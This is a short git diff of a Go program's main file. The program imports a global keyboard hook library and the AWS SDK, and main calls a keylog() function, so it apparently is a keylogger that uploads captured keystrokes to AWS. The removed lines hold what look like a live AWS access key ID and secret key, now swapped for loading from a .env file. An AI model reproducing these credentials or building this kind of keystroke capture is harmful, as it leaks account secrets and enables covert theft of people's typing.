@@ -3,8 +3,9 @@ package main
 import (
 	"fmt"
 	"os"
-	"github.com/robotn/gohook"
 	"time"
+	"github.com/robotn/gohook"
+	"github.com/joho/godotenv"
 
 	"github.com/aws/aws-sdk-go/aws"
 	"github.com/aws/aws-sdk-go/aws/session"
@@ -22,9 +23,10 @@ import (
 
 func main() {
 
-	os.Setenv("AWS_ACCESS_KEY_ID", "AKIAWJXFFCWM7RE6XR7Q")
-    os.Setenv("AWS_SECRET_ACCESS_KEY", "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")
-    os.Setenv("AWS_REGION", "ap-southeast-2")
+	err := godotenv.Load()
+	if err != nil {
+		panic(err)
+	}
 
 	keylog()
 }
